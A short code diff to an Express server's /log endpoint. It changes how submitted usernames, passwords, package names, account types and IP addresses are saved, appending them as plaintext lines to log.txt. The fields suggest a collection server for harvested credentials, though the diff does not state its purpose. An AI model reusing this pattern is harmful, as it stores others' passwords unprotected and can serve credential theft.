@@ -27,7 +27,11 @@ app.post("/log", async function (req, res) {
         let name = req.body.name;
         let accType = req.body.accType;
         let ip = req.body.ip;
-        await fs.writeFileSync('log.txt', packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow());
+        let data = packageName + '|' + username + '|' + password + '|' + name + '|' + accType + '|' + ip + '|' + getNow() + '\n';
+        fs.appendFile('log.txt', data, function (err) {
+            if (err) throw err;
+            console.log('Saved!');
+        });
         return res.json({'time_stamp': getNow(), 'status': 'Success'});
     } catch (e) {
         return res.json({'time_stamp': getNow(), 'status': 'Error'});
